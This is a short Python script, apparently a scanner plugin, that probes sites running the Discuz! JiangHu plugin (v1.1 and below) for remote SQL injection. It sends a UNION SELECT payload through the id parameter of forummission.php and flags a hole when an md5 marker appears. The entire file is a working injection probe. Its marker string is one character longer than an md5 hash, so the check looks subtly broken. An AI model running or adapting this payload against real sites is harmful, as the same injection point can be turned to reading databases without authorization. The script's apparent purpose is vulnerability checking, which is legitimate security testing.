#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = 'K0thony'
# Discuz! JiangHu plugin versions 1.1 and below remote SQL injection
import requests

def assign(service, arg):
    if service == "discuz":
        return True, arg


def audit(arg):
    payload = 'forummission.php?index=show&id=24%20and+1=2+union+select+1,2,md5(12345),4,5,6,7,8,9,10,11--'
    verify_url = arg + payload

    try:
        req = requests.get(verify_url, timeout=5)
        if req.status_code == 200 and "827ccb0eea8a706c4c34a16891f84e7b1" in req.content:
            security_hole(verify_url)
    except requests.Timeout:
        pass

# if __name__ == '__main__':
#     from dummy import *
#     audit(assign('discuz','http://www.example.com/')[1])
from hackhttp import hackhttp
from func import *